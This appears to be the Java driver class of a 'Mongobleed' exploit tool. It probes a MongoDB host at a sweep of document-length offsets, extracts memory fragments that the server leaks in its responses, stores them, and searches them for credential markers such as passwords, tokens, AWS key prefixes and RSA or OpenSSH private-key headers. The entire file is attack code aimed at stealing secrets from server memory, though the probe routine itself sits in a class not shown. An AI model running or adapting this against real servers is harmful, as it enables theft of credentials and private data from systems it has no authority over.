package com.j0lt.mongobleed;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Base64;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Set;

public class MongobleedScanner {
    private static final String[] KEYWORDS = new String[] {
            "password", "secret", "key", "token", "admin", "akia",
            "ssh", "private key", "begin rsa", "begin openssh"
    };
    private static final int MAX_PROBE_ERROR_LOGS = 3;

    public ScanResult scan(ScanConfig config, ScanProgressListener listener) {
        return scan(config, listener, null);
    }

    public ScanResult scan(ScanConfig config, ScanProgressListener listener, LeakSink leakSink) {
        long start = System.currentTimeMillis();
        List<LeakItem> leaks = new ArrayList<>();
        Set<String> unique = new HashSet<>();
        Set<String> keywordHits = new LinkedHashSet<>();
        int totalBytes = 0;
        int probes = 0;
        boolean cancelled = false;
        int probeErrorLogCount = 0;
        int suppressedProbeErrors = 0;

        outer:
        for (int docLen = config.minOffset; docLen <= config.maxOffset; docLen += config.step) {
            if (listener != null && listener.isStopRequested()) {
                cancelled = true;
                break;
            }
            if (config.maxProbes > 0 && probes >= config.maxProbes) {
                break;
            }
            probes++;

            byte[] response;
            try {
                response = MongoBleedClient.sendProbe(
                        config.host,
                        config.port,
                        docLen,
                        docLen + config.bufferPad,
                        config.timeoutMs,
                        config.maxResponseBytes
                );
            } catch (IOException e) {
                if (listener != null && !listener.isStopRequested()) {
                    if (probeErrorLogCount < MAX_PROBE_ERROR_LOGS) {
                        listener.onError(
                                "Probe failed for " + config.host + ":" + config.port + " at offset " + docLen,
                                e
                        );
                        probeErrorLogCount++;
                    } else {
                        suppressedProbeErrors++;
                    }
                }
                response = new byte[0];
            }

            List<byte[]> found = MongoBleedClient.extractLeaks(response, config.maxResponseBytes);
            boolean limitReached = false;
            for (byte[] leak : found) {
                if (leak == null || leak.length < config.minLeakLength) {
                    continue;
                }
                String key = Base64.getEncoder().encodeToString(leak);
                if (!unique.add(key)) {
                    continue;
                }
                LeakItem leakItem;
                if (leakSink != null) {
                    try {
                        leakItem = leakSink.persist(docLen, leak);
                    } catch (IOException e) {
                        if (listener != null) {
                            listener.onError("Failed to persist leak output at offset " + docLen, e);
                        }
                        cancelled = true;
                        break outer;
                    }
                } else {
                    leakItem = new LeakItem(docLen, leak.length, FormatUtils.preview(leak, 120), -1L);
                }
                leaks.add(leakItem);
                totalBytes += leak.length;
                keywordHits.addAll(findKeywords(leak));

                if (config.maxLeaks > 0 && leaks.size() >= config.maxLeaks) {
                    limitReached = true;
                    break;
                }
                if (config.maxTotalBytes > 0 && totalBytes >= config.maxTotalBytes) {
                    limitReached = true;
                    break;
                }
            }

            if (listener != null) {
                listener.onProgress(docLen, config.maxOffset, probes, leaks.size(), totalBytes);
            }

            if (limitReached) {
                break;
            }

            if (config.stopOnFirstLeak && !leaks.isEmpty()) {
                break;
            }
        }

        if (listener != null && suppressedProbeErrors > 0) {
            listener.onError(
                    "Suppressed " + suppressedProbeErrors + " additional probe I/O errors for this scan",
                    null
            );
        }

        long duration = System.currentTimeMillis() - start;
        return new ScanResult(leaks, totalBytes, keywordHits, probes, duration, cancelled);
    }

    private Set<String> findKeywords(byte[] data) {
        Set<String> hits = new LinkedHashSet<>();
        if (data == null || data.length == 0) {
            return hits;
        }
        String text = new String(data, StandardCharsets.ISO_8859_1).toLowerCase();
        for (String keyword : KEYWORDS) {
            if (text.contains(keyword)) {
                hits.add(keyword);
            }
        }
        return hits;
    }

    public interface ScanProgressListener {
        void onProgress(int offset, int maxOffset, int probes, int leaksFound, int totalBytes);
        void onError(String message, Exception error);
        boolean isStopRequested();
    }

    public interface LeakSink {
        LeakItem persist(int offset, byte[] leak) throws IOException;
    }

    public void cancelInFlight() {
        MongoBleedClient.cancelOpenSockets();
    }
}
